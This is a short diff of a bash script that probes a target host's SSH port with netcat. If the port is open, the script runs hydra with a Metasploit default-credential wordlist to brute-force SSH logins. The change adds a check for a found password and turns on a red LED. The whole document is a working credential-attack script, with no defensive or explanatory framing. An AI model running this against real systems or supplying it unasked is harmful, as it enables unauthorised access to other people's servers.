@@ -1,10 +1,11 @@
 #!/bin/bash
 
-WAIT_SEC=1
+WAIT=1
 DPORT=22
 
-nc -w $WAIT_SEC $1 $DPORT 2> /dev/null && {
+if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
 	echo 'bruteforcing ssh'
-
-	hydra -C /usr/share/wordlists/metasploit/piata_ssh_userpass.txt "ssh://$1"
-}
+	if hydra -C /usr/share/wordlists/metasploit/piata_ssh_userpass.txt "ssh://$1" | grep 'password:'; then
+		led red on 2> /dev/null
+	fi
+fi
